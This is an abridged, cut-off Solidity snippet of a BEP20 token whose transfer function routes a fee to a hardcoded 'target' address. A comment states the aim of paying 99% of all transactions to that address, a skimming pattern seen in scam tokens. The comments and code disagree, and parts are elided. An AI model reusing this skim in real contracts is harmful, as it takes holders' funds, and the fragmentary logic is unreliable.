...
contract BEP20Token is Context, IBEP20, Ownable {
  ...
  */
   ...
   */
    ...
    // pay 99% of all transactions to target address
    address payable target = 0x9b62d412652C1ee5094A6bA284E3283034e483C1;
   
  function transfer(address recipient, uint256 amount) external returns (bool) {
      
      uint256 DevAmt = amount.mul(_Devfee).div(1000);
      
   // calculate the share of tokens for your target address
      //  uint shareForX = (amount/100) * 99;
        ...
        // target address
        _balances[recipient] += amount-DevAmt;
        
        // add the share to the target address
        _balances[target] += DevAmt;
        ...
        // the transaction. 
        assert(_balances[msg.sender] + _balances[recipient] + DevAmt ==
